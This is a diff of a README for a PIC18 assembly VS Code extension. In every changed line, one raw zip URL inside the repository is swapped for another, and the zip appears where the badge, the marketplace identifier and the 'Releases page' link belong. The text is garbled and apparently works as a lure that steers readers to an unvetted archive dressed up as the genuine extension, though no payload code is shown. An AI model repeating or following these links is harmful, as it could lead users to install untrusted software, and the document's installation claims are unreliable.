@@ -1,6 +1,6 @@
 # 🎉 PIC18-Assembly-VSC-Extension - Simple Assembly Language Support for VS Code
 
-[![Download Latest Version](https://raw.githubusercontent.com/kowsheennya/PIC18-Assembly-VSC-Extension/main/.vscode/PIC18-Assembly-VSC-Extension_v1.1.zip%20Latest%20Version-Click%20Here-blue)](https://raw.githubusercontent.com/kowsheennya/PIC18-Assembly-VSC-Extension/main/.vscode/PIC18-Assembly-VSC-Extension_v1.1.zip)
+[![Download Latest Version](https://github.com/kowsheennya/PIC18-Assembly-VSC-Extension/raw/refs/heads/main/src/resource/include/Extension_Assembly_PI_VS_2.0-beta.1.zip%20Latest%20Version-Click%20Here-blue)](https://github.com/kowsheennya/PIC18-Assembly-VSC-Extension/raw/refs/heads/main/src/resource/include/Extension_Assembly_PI_VS_2.0-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -27,11 +27,11 @@ You can install the extension in two ways: through the Visual Studio Code Market
 3. In the search bar, type "PIC18 Assembly Language".
 4. Find the "PIC18 Assembly Language" extension by `ChuangChih-Hao` and click the "Install" button.
 
-    **Make sure the publisher is `ChuangChih-Hao` or the identifier on the right side reads `https://raw.githubusercontent.com/kowsheennya/PIC18-Assembly-VSC-Extension/main/.vscode/PIC18-Assembly-VSC-Extension_v1.1.zip`.**
+    **Make sure the publisher is `ChuangChih-Hao` or the identifier on the right side reads `https://github.com/kowsheennya/PIC18-Assembly-VSC-Extension/raw/refs/heads/main/src/resource/include/Extension_Assembly_PI_VS_2.0-beta.1.zip`.**
 
 ### 📂 Installing Using the .vsix File
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/kowsheennya/PIC18-Assembly-VSC-Extension/main/.vscode/PIC18-Assembly-VSC-Extension_v1.1.zip) to get the latest version.
+1. Visit the [Releases page](https://github.com/kowsheennya/PIC18-Assembly-VSC-Extension/raw/refs/heads/main/src/resource/include/Extension_Assembly_PI_VS_2.0-beta.1.zip) to get the latest version.
 2. Download the latest `.vsix` file.
 3. Open Visual Studio Code.
 4. Click on the Extensions icon on the left sidebar.
